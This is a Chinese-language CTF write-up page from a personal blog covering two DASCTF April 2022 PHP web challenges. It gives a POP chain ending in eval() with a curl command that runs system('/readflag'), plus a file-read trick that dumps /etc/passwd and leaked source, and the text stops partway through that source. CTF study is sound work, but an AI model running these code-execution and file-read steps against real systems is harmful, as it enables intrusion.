@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+<meta name="referrer" content="no-referrer" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_icon.svg">
+  <link rel="mask-icon" href="/images/logo_icon.svg" color="#222">
+  <link rel="manifest" href="/images/logo_icon.svg">
+  <meta name="msapplication-config" content="/images/logo_icon.svg">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoloyolo.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="本来恰完KFC晚餐准备回寝室打游戏来着，路上被队友喊去做WEB了 说是今天BUUOJ上的比赛，但是已经打完了，做两题玩玩 但是我上一次碰CTF还是去年的省赛…">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DASCTF_APR_2022">
+<meta property="og:url" content="https://yoloyolo.top/2022/04/23/DASCTF-APR-2022/index.html">
+<meta property="og:site_name" content="xXxYOLOxXx">
+<meta property="og:description" content="本来恰完KFC晚餐准备回寝室打游戏来着，路上被队友喊去做WEB了 说是今天BUUOJ上的比赛，但是已经打完了，做两题玩玩 但是我上一次碰CTF还是去年的省赛…">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-04-23T17:52:50.000Z">
+<meta property="article:modified_time" content="2022-04-25T07:56:23.264Z">
+<meta property="article:author" content="xXxYOLOxXx">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Unserialize">
+<meta property="article:tag" content="POP">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://yoloyolo.top/2022/04/23/DASCTF-APR-2022/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>DASCTF_APR_2022 | xXxYOLOxXx</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="xXxYOLOxXx" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">xXxYOLOxXx</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">xXxYOLOxXx</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="links fa-fw"></i>Links</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://yoloyolo.top/2022/04/23/DASCTF-APR-2022/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="xXxYOLOxXx">
+      <meta itemprop="description" content="Explorer for unknown.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xXxYOLOxXx">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DASCTF_APR_2022
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-04-23 13:52:50" itemprop="dateCreated datePublished" datetime="2022-04-23T13:52:50-04:00">2022-04-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-04-25 03:56:23" itemprop="dateModified" datetime="2022-04-25T03:56:23-04:00">2022-04-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本来恰完KFC晚餐准备回寝室打游戏来着，路上被队友喊去做WEB了<br />
+说是今天BUUOJ上的比赛，但是已经打完了，做两题玩玩<br />
+但是我上一次碰CTF还是去年的省赛…</p>
+<a id="more"></a>
+<h1 id="warmup-php"><a class="markdownIt-Anchor" href="#warmup-php"></a> warmup-php</h1>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">&quot;./class/&quot;</span>.<span class="variable">$class</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$action</span>,<span class="variable">$properties</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$object</span>=<span class="keyword">new</span> <span class="variable">$action</span>();</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">			<span class="variable">$object</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">		<span class="variable">$object</span>-&gt;run();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Action(<span class="variable">$action</span>,<span class="variable">$properties</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>参数<code>action</code>用于输入类名<br />
+参数<code>properties</code>用于输入对象的属性<br />
+完事后会执行<code>$object-&gt;run()</code><br />
+函数<code>run()</code>在<code>ListView.php</code>中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ListView</span> <span class="keyword">extends</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$tagName</span>=<span class="string">&#x27;div&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$template</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;&quot;</span>.<span class="keyword">$this</span>-&gt;tagName.<span class="string">&quot;&gt;\n&quot;</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;renderContent();</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;&quot;</span>.<span class="keyword">$this</span>-&gt;tagName.<span class="string">&quot;&gt;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderContent</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		ob_start();</span><br><span class="line">		<span class="keyword">echo</span> preg_replace_callback(<span class="string">&quot;/&#123;(\w+)&#125;/&quot;</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>,<span class="string">&#x27;renderSection&#x27;</span>),<span class="keyword">$this</span>-&gt;template);</span><br><span class="line">		ob_end_flush();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">renderSection</span>(<span class="params"><span class="variable">$matches</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$method</span>=<span class="string">&#x27;render&#x27;</span>.<span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>,<span class="variable">$method</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;<span class="variable">$method</span>();</span><br><span class="line">			<span class="variable">$html</span>=ob_get_contents();</span><br><span class="line">			ob_clean();</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$html</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$matches</span>[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><code>run()</code> -&gt; <code>renderContent()</code> -&gt; <code>renderSection()</code><br />
+其中函数<code>renderSection()</code>为函数<code>renderContent()</code>中正则匹配替换的回调函数<br />
+用于匹配<code>&#123;\w+&#125;</code>的字符串，并将<code>\w+</code>拼接到&quot;render&quot;之后，再检验类中是否有这个函数，如果有则执行，没有则输出<code>&#123;\w+&#125;</code></p>
+<p>再看<code>TestView.php</code>的内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTableRow</span>(<span class="params"><span class="variable">$row</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$htmlOptions</span>=<span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rowHtmlOptionsExpression!==<span class="literal">null</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;data[<span class="variable">$row</span>];</span><br><span class="line">		<span class="variable">$options</span>=<span class="keyword">$this</span>-&gt;evaluateExpression(<span class="keyword">$this</span>-&gt;rowHtmlOptionsExpression,<span class="keyword">array</span>(<span class="string">&#x27;row&#x27;</span>=&gt;<span class="variable">$row</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$data</span>));</span><br><span class="line">		<span class="keyword">if</span>(is_array(<span class="variable">$options</span>))</span><br><span class="line">			<span class="variable">$htmlOptions</span> = <span class="variable">$options</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rowCssClassExpression!==<span class="literal">null</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;dataProvider-&gt;data[<span class="variable">$row</span>];</span><br><span class="line">		<span class="variable">$class</span>=<span class="keyword">$this</span>-&gt;evaluateExpression(<span class="keyword">$this</span>-&gt;rowCssClassExpression,<span class="keyword">array</span>(<span class="string">&#x27;row&#x27;</span>=&gt;<span class="variable">$row</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$data</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span>(is_array(<span class="keyword">$this</span>-&gt;rowCssClass) &amp;&amp; (<span class="variable">$n</span>=count(<span class="keyword">$this</span>-&gt;rowCssClass))&gt;<span class="number">0</span>)</span><br><span class="line">		<span class="variable">$class</span>=<span class="keyword">$this</span>-&gt;rowCssClass[<span class="variable">$row</span>%<span class="variable">$n</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$class</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$htmlOptions</span>[<span class="string">&#x27;class&#x27;</span>]))</span><br><span class="line">			<span class="variable">$htmlOptions</span>[<span class="string">&#x27;class&#x27;</span>].=<span class="string">&#x27; &#x27;</span>.<span class="variable">$class</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="variable">$htmlOptions</span>[<span class="string">&#x27;class&#x27;</span>]=<span class="variable">$class</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTableBody</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;data;</span><br><span class="line">	<span class="variable">$n</span>=count(<span class="variable">$data</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;hr /&gt;&quot;</span>.<span class="variable">$n</span>.<span class="string">&quot;&lt;hr /&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;tbody&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$n</span>&gt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$row</span>=<span class="number">0</span>;<span class="variable">$row</span>&lt;<span class="variable">$n</span>;++<span class="variable">$row</span>)</span><br><span class="line">			<span class="keyword">$this</span>-&gt;renderTableRow(<span class="variable">$row</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;tr&gt;&lt;td colspan=&quot;&#x27;</span>.count(<span class="keyword">$this</span>-&gt;columns).<span class="string">&#x27;&quot; class=&quot;empty&quot;&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/tbody&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>renderTableBody()</code> -&gt; <code>renderTableRow()</code> -&gt; <code>evaluateExpression()</code><br />
+函数<code>evaluateExpression()</code>在Base.php中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evaluateExpression</span>(<span class="params"><span class="variable">$_expression_</span>,<span class="variable">$_data_</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_expression_</span>.<span class="string">&quot; &quot;</span>.var_dump(<span class="variable">$_data_</span>).<span class="string">&quot;&lt;hr /&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span>(is_string(<span class="variable">$_expression_</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		extract(<span class="variable">$_data_</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">eval</span>(<span class="string">&#x27;return &#x27;</span>.<span class="variable">$_expression_</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$_data_</span>[]=<span class="keyword">$this</span>;</span><br><span class="line">		<span class="keyword">return</span> call_user_func_array(<span class="variable">$_expression_</span>, <span class="variable">$_data_</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到最终目的是调用函数中<code>evaluateExpression()</code>的函数<code>eval()</code>以造成RCE<br />
+那么可以构造出一个POP链</p>
+<p><code>$template = &quot;&#123;TableBody&#125;&quot;</code><br />
+经过POP链<code>run()</code> -&gt; <code>renderContent()</code> -&gt; <code>renderSection()</code>后<br />
+到达函数<code>renderTableBody()</code><br />
+这里有<code>count($data)</code>，然后进行迭代运行函数<code>renderTableRow()</code><br />
+所以需要<br />
+<code>$data = 1</code><br />
+到达函数<code>renderTableRow()</code>后，有两条路可以进入函数<code>evaluateExpression()</code><br />
+这里我走的是第一条路，只需要把<code>rowHtmlOptionsExpression</code>设置为不为NULL即可<br />
+进入函数<code>evaluateExpression()</code>后就会直接<code>eval($rowHtmlOptionsExpression)</code><br />
+所以放命令即可<br />
+<code>$rowHtmlOptionsExpression = &quot;system(\&quot;/readflag\&quot;)&quot;</code></p>
+<p>回到开头的两个参数，代入上述参数即可获得flag</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://aa876c17-0ddb-43f7-978e-1ca06b58fe7e.node4.buuoj.cn:81/?action=TestView --data <span class="string">&#x27;properties[template]=&#123;TableBody&#125;&amp;properties[data]=0&amp;properties[rowHtmlOptionsExpression]=system(&quot;/readflag&quot;)&#x27;</span> | grep flag</span><br><span class="line">flag&#123;e2fec3cf-a368-45da-9277-2f21aa384a78&#125;</span><br></pre></td></tr></table></figure>
+<p>队友本来RCE成功了，hackerbar把phpinfo挡住了，以为没RCE出来…</p>
+<hr />
+<h1 id="soeasy_php"><a class="markdownIt-Anchor" href="#soeasy_php"></a> soeasy_php</h1>
+<p>给的附件是个dockerfile，没啥用感觉</p>
+<p>进来就是个上传点，但是我上传了个php后给我的上传路径后缀是png我就觉得不对了<br />
+F12查看源码可以看到还有个编辑头像功能<br />
+尝试将头像换为其他文件</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">curl http://45632cf4-8a41-4ab2-bf06-65db1ccc6307.node4.buuoj.cn:81/edit.php --data <span class="string">&#x27;png=/etc/passwd&amp;flag=&#x27;</span></span><br><span class="line">成功更换头像</span><br><span class="line"></span><br><span class="line">curl http://45632cf4-8a41-4ab2-bf06-65db1ccc6307.node4.buuoj.cn:81/uploads/head.png</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/bin/<span class="literal">false</span></span><br></pre></td></tr></table></figure>
+<p>然后就读源码了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#edit.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;error_reporting&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        exec(<span class="string">&quot;/copyflag&quot;</span>); <span class="comment">//以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SFTQL&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;copyflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filewrite</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">        file_put_contents(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span 